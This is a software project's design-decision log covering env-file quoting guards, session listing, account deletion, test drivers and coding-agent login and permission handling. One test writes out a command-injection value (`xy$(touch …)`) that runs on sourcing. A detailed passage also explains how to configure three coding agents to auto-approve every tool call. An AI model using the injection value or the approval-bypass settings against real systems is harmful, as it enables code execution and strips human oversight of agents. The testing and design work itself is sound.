**What was wrong.** `set_env` refuses an apostrophe for `*control-plane.env`
because compose's dotenv parser rejects the POSIX `'\''` escape and makes the whole
stack un-startable *and* un-inspectable. But `install.sh` runs its entire interview
against `$ENV_FILE.partial` and `mv`s the result into place — so the guard's
pattern was consulted on writes the interview never makes. Measured:
`control-plane.env` with `it's` was refused and `control-plane.env.partial` with
the same value was written, escape and all.

**Reachable before this change**, through the "URL daemons will dial" prompt, and
much more likely once a password is one of the answers. `deploycheck` tested the
guard against a file literally named `control-plane.env`, which is why nothing
caught it — it now drives both names, and the new case fails against the old
pattern.

**And there was a third path, found later: the guard was keyed on the *filename*.**
`REEMOAT_CP_ENV_FILE=/etc/reemoat/cp.env` — documented in `deploy/README.md`, and
the same override `deploy.sh` needs for its health probe — names a path matching
neither suffix pattern, so an admin called `o'brien` was written with the POSIX
`'\''` escape into the one file compose parses, taking `build`, `up`, `ps`, `logs`
and `config` down together. `_cpenv=$(env_file control-plane)` is now an arm of its
own **beside** the two suffix patterns rather than replacing them, so the guard
follows the file rather than its name and the existing fixtures (which live in a
sandbox root, not `$HOME/.reemoat`) still refuse.

**The lesson repeated itself one level up**, which is the part worth carrying: this
entry already recorded that testing the guard against a file *literally named*
`control-plane.env` is why nothing caught the `.partial` hole, and the same fixture
choice then hid the override hole. `deploycheck` now drives it with **both**
overrides set — so a guard that also resolved `env_file daemon` and refused an
apostrophe there is caught too — and pins that a file genuinely named
`control-plane.env` is still refused while the override points elsewhere.

**What else it needed.** `ask_secret`, which **re-asks** on an apostrophe rather
than `exit 2`: that exit is right for a programming error and wrong mid-interview,
where it kills the wizard after the partial file is half-written and the operator
answers every previous question again, over one character.

**Status.** Current.

### Q7.58 — What can a list of your own sessions honestly say?

**Decision.** A browser, an address and when it was last used — recorded, drawn,
and never trusted.

**What it said before.** `s_69ad31c3`, a creation date, and a "sign out" link.
That id is *ours*: it names a row in our database and corresponds to nothing a
person has ever seen. So the only question the list exists to answer — *which of
these is not me?* — was unanswerable, and per-row sign-out was a coin flip between
five identical things. It was replaced by a count and one button, which was honest
and useless, and stayed that way for exactly as long as it took to give the rows
something to say.

**Why it needed a table.** `user_session_origins(session_id, ip, user_agent)`
rather than two columns on `user_sessions`, for the reason `user_passwords`,
`machine_owners` and `machine_tunnel_keys` each give in turn: `schema.sql` is
re-applied on every open, `CREATE TABLE IF NOT EXISTS` is idempotent for a whole
table and useless for a new column, and this package has no `migrate()`. An `ip`
column would exist on every database created after this commit and be silently
absent on every one created before it — including the one this is deployed to.

**Absence is the migration, and it lands somewhere visible.** A session that
predates the table is listed with nulls and reads "Unrecognised device", which is
the row somebody is most likely to want to end. The join is `LEFT` for that
reason; an inner one would have hidden exactly those.

**Neither field is evidence, and this is the load-bearing sentence.** The
`User-Agent` is a request header. The address is the socket only when nothing has
forwarded it, and `x-forwarded-for` is a header like any other — this service has
no trusted-proxy setting, and `callerAddress`'s own comment has always said the
value is never used for a decision. Somebody holding a stolen token can write
both. So the list is a way to **end** sessions rather than a way to judge them,
and the remedy it offers is identical whatever a row says.

**What the address needed.** Reading `x-forwarded-for` alone recorded the literal
string `unknown` for every session on a control plane with no proxy in front of it
— which is the default shape here. `net.ts` falls back to the socket, prefers the
header where there is one (behind a proxy the socket is the proxy), and unmaps
`::ffff:` so a person can recognise their own network. Pure, so `relaycheck`
reaches branches no socket in this repository can produce.

**Where the parsing lives, and why not on the server.** In the browser, in
`device.ts`. What a `User-Agent` *means* is a question whose answer ages, and the
raw string is the only thing that does not; storing our reading of it would freeze
today's table into every row. The table is **ordered** rather than the matcher
being clever, and the order is the whole correctness argument: these agents are
subsets of each other on purpose, because a browser claims its predecessors so
that sniffing written before it existed keeps working. Chrome's ends `Chrome/141
Safari/537.36`; Edge's is that plus `Edg/141`; on iOS every browser is WebKit and
only the name differs; Android's begins `Linux; Android`. Matching in the wrong
order calls every desktop browser Safari, every Edge Chrome, every iPhone Safari,
and every phone a desktop — four wrong answers, each of which looks right until
somebody signs in from the one device this machine does not have. `webcheck` is
the only thing that will ever exercise them.

**No versions.** A version is the part that ages worst, the part a person
recognises least, and the part that makes a parser need maintaining. Two words do
the job.

**Correction, made on the first reading by somebody who was not me.** The two
fallbacks were one sentence. A session that predates the table carries no agent;
a session from a client the table does not know carries one nobody could read.
Both drew as "Unrecognised device", and the first question asked on seeing it was
*what is that — did it fail to detect?* It had not: nothing was ever handed to the
parser. They need different words because they have different remedies — sign in
again and it will be recorded, versus that row is as identified as it will ever
get, read the address instead. The label that answers a question the reader did
not ask is the one that gets asked about.

**Status.** Current.

### Q7.60 — Can a person be deleted, and what does "rows are never deleted" cost?

**Decision.** Yes. Disable stays the reversible act and the usual one; `DELETE
/v1/admin/users/:id` is the other one, and there is no undo.

**What the schema said.** *"Rows are never deleted: a token already in the wild
names this subject, and the audit trail should still say who that was."* Half of
that is real and half is not, and neither half survives the actual request. A
disabled account is a permanent row in the list read to answer "who can use this",
so somebody who left in March is four of its ten rows for ever — and `users.name`
is UNIQUE, so their name is held for ever too.

**What was real, and is now written down instead of enforced.**
`enrollment_codes.created_by` can name a user who is gone. It is left dangling on
purpose rather than cascaded: that row's job is to say what happened, and
rewriting history to keep a join valid is the opposite of an audit trail.

**What is removed.** Every credential that authenticates as them — password, API
keys, sessions and their origins, **and every unredeemed enrollment code they
minted** — plus grants and `machine_owners`, in one transaction. The transaction
is the point rather than the tidiness: a `users` row
deleted with an `api_keys` row left behind is a credential belonging to nobody.
`callerAuth` joins `users`, so it fails closed either way — and it would also be
invisible to every list an admin can read, which is the worse half.

The enrollment code was the one this route missed, and it is the sharpest of them:
`/v1/enroll` sits above THE LINE and asks only whether a code is unused and
unexpired, so a just-deleted account could redeem one it was holding, receive the
machine id and the fleet's public keys, and have `issueTunnelKey` retire the
legitimate daemon's key in the same call. `burnUserCodes` closes it without
touching `created_by`; the credential dies, the history does not. See Q1.42.

**Machines survive, ownerless — and that is no longer a dead end.** It is exactly
what every machine created before ownership existed already is, and `cpctl admin
machines` still lists them. Revoking them instead would take a daemon somebody may
still be running off the network as a side effect of tidying a user list; taking a
machine down stays its own verb, and the response says how many were released so
nobody discovers it later. What was missing is the way *back*: ownerless used to
be one-way, so a person leaving the fleet stranded their hardware permanently.
`PUT /v1/admin/machines/:id/owner` is the inverse of `machinesReleased` (Q1.43).

**Deleting yourself is refused**, and that refusal is doing more work than
`cannot_disable_self`'s: it is what makes "there is always an enabled admin left"
true by construction rather than by a guard, since every caller past `requireAdmin`
is an enabled admin and cannot be the row being removed. It is the same reasoning
that made the old explicit `last_admin` check unreachable dead code (Q7.55).

**Two steps in the UI**, and it was the first of what are now four (Q3.95). The
first tap replaces the row's buttons with the question and its two answers, so
there is nothing else on the row to hit by accident and the name is still beside
it — and the confirming row **ends with Cancel**, which is not arrangement but the
guard against a double-tap on a laggy connection landing on the irreversible half.
Inline rather than a modal — and the app *has* one now (Q7.68), so the surviving
reason is the shape rather than the absence: a question, its answer and its undo
laid out left-to-right is a row, and a dialog moves the name it is about.

**Status.** Current.

### Q7.59 — Where does `scrollbar-gutter: stable` cost more than it buys?

**Decision.** In the rail. Removed there, kept in the transcript and the content
pane.

**What went wrong.** `index.css` forces a classic scrollbar on a pointer device
(`scrollbar-width: thin`), so `scrollbar-gutter: stable` reserves about ten pixels
on the inline-end edge whether or not anything is scrolling. In `main` that strip
lands against the window's own edge and nobody can see it. In `AppShell`'s
`<aside>` it lands immediately left of `border-r` — so every row separator in the
session list stopped ten pixels short of the divider, and the column read as
having come unstuck from its own border. Reported as "a gap appeared", which is
exactly what it looks like.

**Why it appeared to appear.** The strip is only empty when the list *fits*. With
enough sessions a scrollbar is drawn in it and it reads as a scrollbar. Shrink the
list and the same ten pixels become unexplained white space, with nothing having
changed.

**Why the rule still holds where it is.** The gutter buys that content does not
shift when a box crosses the fit threshold, and the case that earned it is the
transcript, where a *centred* label slides sideways for no visible reason. The
rail is left-aligned: what moves when a scrollbar arrives is the right-hand edge,
which is where the scrollbar then is. The movement explains itself, which the
transcript's never did. Same mechanism, opposite answer, because the thing being
protected is different.

**Not reproducible on the machine that fixed it.** A Mac left on the default
"show scroll bars when scrolling" reserves nothing, and headless Chrome uses
overlay scrollbars unconditionally — measured, `clientWidth` does not move for any
combination of `scrollbar-width` and `scrollbar-gutter`. So the fixture built to
demonstrate it could only demonstrate its own absence, and the diagnosis rests on
the mechanism being the only one in this stylesheet that produces an *empty*
reserved strip inside a scroll box. Written down because the next person to look
will fail to reproduce it too.

**Status.** Current.

### Q7.41 — What can the relay's own metrics answer?

**Position.** Little. `requestsProxied` and `activeStreams` per tunnel existed to
prove a client had gone *direct* — a question with no meaning now that there is
one path — so what they are is plain traffic accounting.

**Why not yet.** There is no latency, no error rate and no retention.

**What it would take.** "The relay got slower last Tuesday" is not a question
this can answer, and it is a better question to be able to answer now that
everything goes through it.

**Status.** Not built.

### Q7.42 — Is there a fleet rollout, and is a restart drained?

**Position.** Neither. `deploy/deploy.sh` updates the host it runs on, so a
change reaches N daemons in N invocations. Nothing is automated, and the hook for
automating it is `--ref <sha>` and nothing else. A restart is not drained: the
daemon is asked to stop while sessions are live, and `interrupted` is the correct
outcome rather than a graceful one.

**Why not yet.** Waiting for idle would need the deploy to read session state,
which is a route call and a policy nobody has picked. What an undrained restart
costs is now *one turn* rather than the conversation — the daemon reattaches on
its way back up — so a drain buys less than it did.

**Status.** Deliberate non-goal.

### Q7.43 — Is the ACP adapter's version pin checked against anything real?

**Position.** It is now checked against what is *installed*, not only against
other text. Every ACP assertion compared files to each other and none of them to
disk, so a lockfile that resolved 0.62.x under a `package.json` reading 0.63.0
passed all of them. Nothing asserted the pins were *exact* either, so consistent
`^0.63.0` ranges passed while different resolvers produced different builds.

**What it would take.** Done: `pincheck` reads the adapter it can actually
resolve.

**Status.** Known limitation (of the assertions that preceded it).

### Q7.44 — Can kimi's version be pinned?

**Position.** No, and nothing can pin it. Its version lived in the container
image and nowhere else, and it is resolved from PATH now — so this repository no
longer records which build its measurements were taken against, and
`src/acp/client.ts` cites several.

**Why not yet.** The claude half went the other way and is worth stating as the
better outcome: with no image, the `claude` somebody logs in with is the one the
SDK resolves for the adapter, so that pin is **structural** rather than asserted,
and re-adding a check for it would be re-adding a check for something that cannot
now drift.

**Status.** Known limitation.

### Q7.45 — Should `minimumReleaseAge` be switched on?

**Position.** `minimumReleaseAgeExclude` is set and `minimumReleaseAge` is not,
so it currently excludes nothing — and `pincheck` had an assertion on it,
guarding a line with no effect while its own header called that line "what lets
the pin be installed at all". The check now reports the state instead of implying
it.

**Why not yet.** It has a measured cost: with `minimumReleaseAge: 10080` on
2026-08-02, 27 lockfile entries are rejected — every `@rollup/rollup-*@4.62.3`
platform binary, published six days earlier under Vite — so every `pnpm <script>`
fails until they age out. It also applies to `--frozen-lockfile`, which turns an
offline install into a network verification of all 367 entries, in CI and on
every deploy.

**Status.** Blocked on a decision.

### Q7.46 — Was anything in `deploy/` checked?

**Position.** Nothing was, and now the derivable half is. This used to say the
deployment path was the one thing proven only by running it, and named the way
out — "a driver that renders the templates and diffs them".

**What it would take.** Done: `deploycheck` sources `lib.sh` under `sh -c` from
`deploy/` (the only directory `$0` resolves it from, which is why no shim had to
be committed beside the thing being tested), against a `mkdtempSync` `HOME`.

**Status.** Known limitation, now partly closed.

### Q7.47 — What exactly does `deploycheck` drive?

**Position.** It is enumerated in the driver's own header rather than described,
and that is a correction. Both the header and this entry said "every function
whose answer is derivable", which is the kind of sentence that is true the day it
is written and quietly false a function later — it was already false when
written: `service_origin`, `health_probe_target`, `env_value`, `unit_template`
and `resolve_bin` are all derivable and none was driven.

**What it would take.** They are now, and the list is spelled out in both places
so the next gap is visible rather than covered by an adjective.

**Status.** Known limitation (of the adjective, now replaced by a list).

### Q7.48 — Which of those five mattered most?

**Position.** `service_origin`, because the sentence this section replaced named
it: the parts of `deploy/` most worth asserting were "that a unit renders, that a
wrong service name is refused, **that the health address survives a wildcard bind
and a `REEMOAT_PORT=0`**". The first two landed and the third did not, and the
replacement text did not say which third was missing.

**What it would take.** Both halves are driven now — `0.0.0.0`, `::` and an empty
host all resolve to a loopback the probe can actually connect to, and
`REEMOAT_PORT=0` reports *skipped* rather than red, which is what keeps every
relay-only host from failing its own deploy.

**Status.** Known limitation, now closed.

### Q7.49 — Why was shell quoting the first thing driven, ahead of unit rendering?

**Position.** Because `sq`'s failure mode is not a broken file, it is arbitrary
code as the daemon that runs the operator's agents — those environment files are
`.`-sourced by `run-daemon.sh`.

**What it would take.** Fourteen hostile values now make the round trip out
through `sq`, into a file and back in through `.`, and the *unquoted* control runs
beside them: the driver asserts that `xy$(touch …)` written raw really does
execute on source, so a green quoting case is known to be `sq` working rather
than sourcing being harmless. Measured by weakening `sq` to `printf '%s'`: 19
assertions go red and `deploy/PWNED` appears in the repository.

**Status.** Known limitation, now closed.

### Q7.50 — Did writing the driver find real defects?

**Position.** Two, which is the whole argument for having written it. Neither was
reachable from any caller today, and both were one caller away.

*`sq` silently shortened its own input.* It wrapped the quoted value in `$( )`,
which strips trailing newlines — measured, a two-byte value `a\n` wrote `K='a'`
and read back one byte. A sentinel byte appended before the substitution and
removed after is the only form that survives. The original fixture list had a
newline case and it was an *interior* one, which the bug leaves untouched: that
is exactly how a green suite sat over it.

*`set_env`'s replace arm turned a multi-line value into an unsourceable file.*
`awk`'s `index($0, k "=") == 1` matches a **physical** line, so replacing a
multi-line value rewrites its first line and orphans the rest — measured,
`REEMOAT_TOKEN='line1⏎line2'` re-set to `new` left a bare `line2'` behind and
`.`-sourcing it died with `unexpected EOF while looking for matching quote`,
which is `run-daemon.sh` unable to start the daemon at all.

**What it would take.** A newline is now **refused** for either file, beside the
apostrophe refusal the control plane's file already had. Refusing is the honest
answer rather than repairing: every value comes from `ask`, which reads one line
with `IFS= read -r`, so no caller can produce one and this narrows nothing
anybody can reach.

**Status.** Known limitation, now closed.

### Q7.51 — Were any of the driver's assertions passing for the wrong reason?

**Position.** Two, and both are worth recording because each looked like
coverage. The 0600 checks credited `umask 077` — delete both `umask 077` lines
and the mode is still 0600, because `set_env` ends with an unconditional
`chmod 600`. And the `file_value` "not fatal under `set -e`" case put the call in
*argument* position, where POSIX says a command substitution's status does not
reach the enclosing command — so with the `[ -f ]` guard deleted outright it
still went green.

**Why not yet.** What the umask actually protects is the transient
`$_file.tmp.$$`, which holds a copy of a file whose whole content is
`REEMOAT_TOKEN`; nothing observes it, and observing it would mean racing the
function under test. That window is stated as unchecked rather than pinned by an
assertion about something else.

**What it would take.** `file_value` is driven in the assignment form the real
callers use, which is the form errexit propagates through and the one the
incident in `lib.sh`'s comment describes.

**Status.** Known limitation.

### Q7.52 — Is `runtime_path`'s group-writable warning actually exercised?

**Position.** In both directions now, which matters because it is the only
security-relevant thing that function says and the only `ls -ld` + `awk`
construct in the whole driven surface — i.e. the one place the CI step's own
justification about BSD-versus-GNU divergence could ever pay off.

**Why not yet.** The fixture directory was `mkdirSync`'d at 0755, so the branch
was silent and the assertion beside it was green either way.

**What it would take.** The mode is set explicitly now, so the ambient umask
cannot decide what is measured.

**Status.** Known limitation, now closed.

### Q7.53 — What does `deploycheck` still not reach?

**Position.** No real launchd or systemd, no `install.sh` interview end to end,
and nothing about `deploy.sh`'s `git reset --hard` path. The boundary is the same
one `imagecheck` draws, and it is stated in the driver's own header.

**Why not yet.** Those touch a supervisor and the checkout, and a driver that
drove them would be doing the thing it is testing.

**What it would take.** `INIT_SYSTEM=none` is the one exception in the other
direction: `detect_init`'s comment says that state "is also untested on both
machines this has ever run on, because neither can reach it", and this driver is
the thing that *can* reach it, so it now pins what the naming helpers do there —
derive nothing — which is the shape `service_exec` and `render_unit` deliberately
refuse instead.

**Status.** Known limitation.

### Q7.54 — How does the driver prove it changed nothing?

**Position.** Its last case asserts the isolation held — `~/Library/LaunchAgents`
gained nothing, and `deploy/` is in the same git state the run found it — because
a driver that installed a unit as a side effect of passing would be arming the
ten-second crash loop `install.sh` exists to avoid.

**Why not yet.** In the same git state, **not byte-for-byte**: it compares
`git status --porcelain` against a baseline taken before anything ran. That is
deliberate — the driver is most likely to be run by somebody *editing* `deploy/`,
and demanding a clean tree would go red on their uncommitted work — and it is
therefore blind to a further edit of a file that was already dirty.

**What it would take.** The driver's own docblock says so; this line used to
claim more than the driver does.

**Status.** Known limitation.

### Q7.61 — Should an admin password reset burn the account's enrollment codes?

**Position.** Closed by deletion. Everything below describes a route that no longer
exists and is kept for the argument, not for the behaviour — the answer is at the
end.

**Where the asymmetry was.** `POST /v1/admin/users/:id/password` swept every session
and every API key the account holds — on the argument its own docblock gives, that a
reset exists for the case where somebody else may have the account, so leaving a
permanent credential in place hands it back to whoever has that instead. An
unredeemed enrollment code is a credential by exactly the test Q1.42 applies:
`/v1/enroll` sits above THE LINE, asks only whether the code is unused and
unexpired, and `issueTunnelKey` retires the running daemon's tunnel key in the same
call. By that argument the sweep should have burned codes too. It did not.

**Why it was not just done.** Unlike `disable` and `delete`, this route was also the
*self*-recovery path — an admin re-keying their own account after a suspected leak,
which Q1.610 says is the ordinary case and the reason `proveSelf` allows self at all.
Burning your own in-flight daemon install as a side effect of changing your own
password is a cost nothing has measured, and the account is not being taken away
from anybody.

**What would have settled it.** Whether the reset can tell the two cases apart. It
could not: the route was one verb whether an admin was recovering their own account
or somebody else's, and `proveSelf` already treated those differently for the
*credential* it demanded. Splitting on the same test was the obvious shape of an
answer and was never attempted.

**Superseded — there is no admin password reset.** `POST
/v1/admin/users/:id/password` is deleted, and with it `POST
/v1/admin/users/:id/keys` and `withKey` (Q7.74), and `proveSelf` with them —
`proveCurrentPassword` is what is left of it, asking about the caller and never
about an `:id`. The invariant that replaced all three is *no route in this service
issues a credential for an account other than the caller's own*, so there is no
longer a route that both belongs to an admin and rewrites somebody's password. That
answers the heading by removing its
subject rather than by measuring anything, which is why this is superseded rather
than decided — the question "can the route tell recovery from takeover apart" was
answered by there being nobody but the account holder on it.

What replaced it is `POST /v1/reset`, driven by a mailed single-use link, and it
**deliberately leaves enrollment codes alone**. The argument that made the old
sweep right does not carry over: that route existed for the case where somebody
else may hold the account, and this one is reached only by proving control of the
address the account already confirmed. Proving your own address is not evidence
that a daemon you enrolled is compromised, so burning your fleet's in-flight
installs would be a cost paid by the ordinary case. What it *does* sweep is stated
at the route: `revokeAllSessions`, then `burnEmailTokens(db, held.userId,
"password_changed", now)` so no sibling link survives the password it just changed.
API keys are not swept either — they are only *counted*, into `apiKeysActive`, so
the screen can say a permanent credential is still out there rather than silently
retire one.

**Still no driver asserts it**, and now for a smaller reason than before: nothing in
`relaycheck`'s reset coverage reads `enrollment_codes`, so "the mailed reset leaves
codes alone" is a property of the statements in that transaction and of nothing
else. Q1.42's burn is asserted on `delete` and on `disable`; this is the third case
and it is asserted by absence.

**Status.** Superseded — the route the question was about is deleted; the mailed
reset that replaced it leaves enrollment codes alone on purpose

### Q7.62 — Is the upload route's body-cancel discipline reachable past the middlewares above it?

**Position.** Answered, and the question named the wrong half. The handlers'
discipline was complete; the middlewares above them were the gap. The obligation
now hangs off the exemption that creates it rather than off each handler.

**The claim.** `POST /sessions/:id/uploads` reasons carefully about always
cancelling a body it refuses (Q5.72), and the auth gate and the scope check sit
*above* it — so a 401 or a 403 answers without reading or cancelling the 25 MiB
the client is still sending.

**What was found.** The claim is right about the gap and wrong about where to look
for it. Every refusal *inside* the three streaming handlers already cancels —
`refuse()` at `/sessions/:id/uploads`, at `/fs/import` and at `POST /plugins` —
and there is no path through any of those three that answers with a body it has
neither read nor released. What has no wrapper is everything above them: the auth
gate's `return jsonError(c, 401, …)` and `requireScope`'s
`return jsonError(c, 403, "insufficient_scope", …)` both answer having never
touched the stream. So the reachable case is not "a handler forgot one", it is
"the handler never ran" — a bad token, or a valid one without `machine:admin`,
refused in about a millisecond with the whole body still to come.

**Decision.** The cancel goes where the exemption is granted: the one
`app.use("*")` that consults `isStreamingRoute` now runs `next()` in a `try` and
releases `c.req.raw.body` in the `finally`. Two halves of one rule, in one place,
so the fourth streaming route inherits both by adding one string to the predicate
— which matters because `isStreamingRoute`'s own docblock had already predicted
this failure one axis over, and the third route had just arrived.

**Why not the remedy this entry refused.** That objection was to `cancelBody` in
the *global* gate, which would destroy the request stream on every refusal
carrying a body and break `401 token_expired` on `POST /sessions/:id/prompt`,
which `machine.ts`'s single-retry refresh depends on receiving as a readable
envelope. It still would. This is the narrow version: the guard is inside the
`isStreamingRoute` branch, so it is reachable **only** on the three routes
`boundedBody` does not wrap, and a prompt's 401 never meets it. Nothing moved off
a route's registration line either, so Q4.28's convention is untouched.

**What is measured.** 2026-08-22, against this adapter (`@hono/node-server`
1.19.17) with a `serve()` on loopback, in the four states the guard can find a
body in. A middleware that cancels an untouched body and *then* answers 403, and
one that answers 403 and then cancels, both deliver the 403 to the client — a
64 MiB streamed body, refused after 1.4–2.1 MiB had been sent, arrived as
`{"error":{"code":"insufficient_scope"}}` and not as a reset connection. A body
the handler had already drained cancels in 0 ms and changes nothing, because a
fully-read request is `complete` and the `destroy()` underneath never reaches the
socket — the 64 MiB case still answered 200 with all 67108864 bytes counted. A
body the handler left locked rejects with `TypeError: Invalid state:
ReadableStream is locked`, which `cancelBody` swallows. That last one is why the
guard is unconditional rather than gated on a status: there is no state it can
find the stream in that costs anything, so it needs no second copy of "which
answers are refusals".

**What is still not measured**, and it is the half this entry was originally
about: the same refusal *through a real relay*. Whether destroying a half-sent
body on an h2 CONNECT stream reaches the browser as the daemon's own status or as
the relay's `502 tunnel_failed` is the trade the upload route's "honoured to
refuse, never to accept" comment reasons about, and loopback cannot answer it.
What has changed is which way the risk runs: before, an unread body parked the
sender and the tunnel's 8 MiB valve took **every session on the machine** down
with it; now the worst case is one caller told the wrong thing about one refused
request. That is the right way round even unmeasured.

**What would still settle it.** A 25 MiB upload and a 2 MiB plugin archive pushed
through the relay under a read-only grant, watching what the browser is told.

**Status.** Fixed — with the relayed half of the measurement still outstanding.

### Q7.63 — Does BSD `script` survive a full device flow with no stdin?

**Question.** `loginStdio` spawns a non-interactive login on BSD with
`stdio: ["ignore", …]`, which is what makes kimi's and codex's wizards work on
macOS at all. Whether `script` stays alive for the fifteen minutes a device-code
flow can take, with `/dev/null` giving it immediate EOF, is not established.

**What is measured.** 2026-08-08, both halves from one daemon on macOS:
`POST /agent-auth/kimi/login` exited 0 with `Logged in to managed:kimi-code.`,
and `POST /agent-auth/claude/login` — which keeps its pipe — exited 1 with
`script: tcgetattr/ioctl: Operation not supported on socket`. So the spawn works
and the fix is real. But that kimi was **already signed in**, so it returned in
under a second and the long case was never exercised.

**Why it was not settled.** Settling it means signing an agent out of the machine
this is developed on and back in through the wizard, which is a live credential.

**What would settle it.** One real device-code login on macOS, watching whether
the URL and the code stay on screen until the browser side completes.

**If it fails**, the fallback is already in place rather than needing design:
`ui/login.ts` recognises the failure, the card says it in a sentence, and the
paste box is one disclosure away.

**Status.** Open.

### Q7.64 — Are `ui/login.ts`'s device-code patterns measured?

**Question.** No — and the asymmetry is deliberate rather than an oversight. The
failure table's first entry is the exact string BSD `script` prints, verified. The
code patterns (a code-shaped token near the word `code`, else a bare
`XXXX-XXXX`) are conservative guesses at prose three vendors may reword.

**Why shipping a guess is acceptable here and would not be elsewhere.** The
fallback inverts the cost: `transcriptIsTheAnswer` opens the raw output when
nothing is recognised, so a pattern that misses costs the screen this replaced
rather than a blank one. A pattern that *false-positives* costs a wrong code
displayed beside the transcript that contains the right one. Neither is a state
somebody cannot get out of, which is what a guess has to clear to be shippable.

**What would settle it.** Capturing a real `kimi login` and `codex login
--device-auth` transcript from a signed-out agent — the same run that settles
Q7.63 — and adjusting the patterns to what they print rather than the reverse.

**Status.** Open.

### Q7.65 — Does `codex login --with-api-key` close the -32000 gap?

**Question.** `AGENT_LOGIN.codex` records that a pasted `CODEX_API_KEY` reaches
codex's API calls and still leaves `codex-acp` refusing `session/new` with -32000
"Authentication required", because the adapter wants `auth.json` on disk. Measured
2026-08-08, `codex login --help` offers `--with-api-key`, which reads a key from
stdin and is documented as writing exactly that file.

**Why it matters.** It would turn codex's paste box from the weaker of two paths
into a real non-interactive login — and codex is the agent whose wizard is a
device-code flow nobody can complete without leaving the app.

**Why it was not acted on.** It needs a real key piped into a real login on a
machine that is already signed in through ChatGPT, and the run replaces that
credential. The plausible-looking change — have the paste route shell out to
`codex login --with-api-key` — also makes a credential save spawn a process,
which is a different failure surface from a database write and wants the
measurement first.

**Status.** Open.

### Q7.66 — What is each agent's own permission surface, and can "allow everything" be written into it?

**Status first: the permission settings were built and then taken back out**,
to be reintroduced in pieces. What is kept here is the *measurement*, because it
was expensive to obtain and none of it depends on the UI that is gone: three
agents, three different rule surfaces, and one question — can each express
"allow everything" in its own config, or only through a mode?

The answer, in one line: **the mode is the only mechanism that is present for
all three, means "everything" without an enumeration, takes effect immediately
on a live session, and installs nothing.** The detail below is why.

**Also removed with it**, and worth naming so nobody looks for them: a
`agent_policies` table (`approvals` / `default_mode` / `known_modes`), an
`allow_all` branch in `resolvePermission` with its own `AnswerResolvedBy`
member, a mode probe that started a throwaway session to ask an agent what
modes it has, a rules editor over claude's `settings.json`, and the routes
`PUT /agent-auth/:agent/policy`, `POST /agent-auth/:agent/modes` and
`GET|PUT /agent-auth/:agent/vendor`. A deployed daemon keeps its `agent_policies`
rows on disk — nothing reads them, and they are left rather than dropped so a
reintroduction has them.

**Measured per agent 2026-08-08.** The question is whether each agent's own
config can express "allow everything" in one rule, rather than an enumeration
that goes stale the day a tool is added.

**claude — refuses it by design, and says so itself.** The settings validator
rejects a wildcard in `permissions.allow`: *"Wildcard tool name `*` is not
supported in allow rules — an allow pattern must name the scope it widens; globs
are permitted only in the tool position after a literal `mcp__<server>__`
prefix. Deny and ask rules accept wildcards anywhere."* Confirmed empirically
with `claude doctor` under an isolated `CLAUDE_CONFIG_DIR`: `*`, `*(*)`, `Tool*`
and `*_*` are each reported as skipped, while `Bash`, `Bash(*)` and
`mcp__foo__*` are accepted — and the mirror run shows the same wildcards are
legal in `deny` and `ask`. The matcher enforces it a second way: the allow lookup
does not pass the glob flag at all, so only the MCP branch can widen.

Enumeration cannot close either: the CLI carries a live rename map
(`Task → Agent`, `KillShell → TaskStop`, …), and MCP tool names are formed at
runtime from whatever servers are configured, so there is no list to write. The
one config text meaning "everything" is `permissions.defaultMode:
"bypassPermissions"` — a **mode key, not a rule**, which short-circuits *before*
the allow rules are consulted. That is the same thing the toggle already sets,
written to disk instead of sent over ACP.

**kimi — a catch-all exists, and two properties disqualify it as the
mechanism.** `[[permission.rules]] decision = "allow", scope = "user", pattern =
"*"` really does match every tool. But the rules are read **once**, at
`session/new` and `session/resume`, with no watcher — so a toggle backed by them
would stop taking effect on a live session while the `setMode` path is
immediate, and one switch with two timings is a bug generator. And
`~/.kimi-code/config.toml` is the *user* config: it would be a machine-wide grant
that also applies to `kimi` in a terminal, which is a wider promise than a
toggle on a settings screen makes.

**codex — a catch-all exists and it is not a rule, it is a hook.** Within
execpolicy there is genuinely no wildcard (`PrefixPattern` is exact tokens or
`any_of` alternatives, and an empty pattern is refused), so the first reading was
"enumeration only" — and an adversarial check refuted it: codex's **hooks**
subsystem is stable and on by default, and a `PermissionRequest` hook with
matcher `"*"` emitting `{"behavior":"allow"}` covers every tool without going
stale. Two things make it the wrong lever anyway. It is a **command to execute**,
so "allow everything" would mean installing an executable into somebody's agent
config — categorically heavier than setting a mode. And it answers the
*approval*, not the *sandbox*: `approvalPolicy` and `sandboxPolicy` still arrive
from the ACP mode on every turn, so it could replace the daemon-side auto-answer
and never the mode. (`PreToolUse` cannot grant at all — the binary carries
*"PreToolUse hook returned unsupported permissionDecision:allow"*.)

**So the mode is the only mechanism that is all four of:** present for all three
agents, meaning "everything" without an enumeration, effective immediately on a
live session, and installing nothing.

**What survives from the question.** The toggle is invisible from a terminal:
the mode applies to sessions this daemon starts and the auto-answer is ours
alone. Writing config would unify that — as an opt-in beside the toggle rather
than as its mechanism, because it widens the blast radius from "sessions
Reemoat starts" to "this agent, on this machine, everywhere".

**Status.** Current

### Q7.67 — Machines became a tab bar. How does an approval stay unhidable?

**Question.** The sidebar was one collapsible section per machine, so every
session in the fleet had a row and a *collapsed* section still announced
`blockedCount`. Folder tabs show one machine at a time. A blocked session on any
other machine now has no row at all, and the tab that would carry its count can be
scrolled off the end of a horizontally scrolling bar. What replaces the guarantee?

**Decision.** `waitingFloor(groups, view)` in `ui/groups.ts`, computed by
**subtraction**: the union of every key the current view can draw — pinned ∪ every
folder of the selected machine, *ignoring collapse* ∪ orphans, each under the
filter and the needle — subtracted from every row in the fleet with `needsHuman`.
Whatever is left is drawn in its own section directly under the tab bar and above
the search box.

**Why subtraction rather than a rule.** A rule ("also show blocked rows from other
machines") has to be remembered by whoever adds the next section, the next filter
or the next grouping. A subtraction cannot be forgotten: a group that stops being
drawn stops being counted as reachable, and its rows surface automatically.

**It ignores the filter and the needle, deliberately.** Same reason
`machineSubline` puts `blocked` above `offline`: a filter is a slice you asked
for, and being asked for an approval is not something you can ask to stop. A
*collapsed* folder is not lifted, because its own header carries the count — the
mechanism this app already had.

**The measurement.** `webcheck` asserts this as a superset property over every
filter × every machine selection × a set of needles, rather than as a list of
expected keys. It paid for itself on the first run: reachability was being
computed from `rowsOf(group, filter)` **without** applying the needle, while
`foldersOf` applies it — so a blocked row filtered out by four letters in the
search box was counted as reachable and never lifted. Typing hid an approval. No
amount of reading the code had caught it; the property did, immediately.

**Vertical order is part of the answer.** The floor sits *above* the search field,
so the column reads as what it is: the tab bar and the floor are fleet-scoped,
everything from the search down is scoped to the selected machine. Below it, a row
from another machine would read as a search result.

**Status.** Current

### Q7.68 — This app had no modal. Should it grow one?

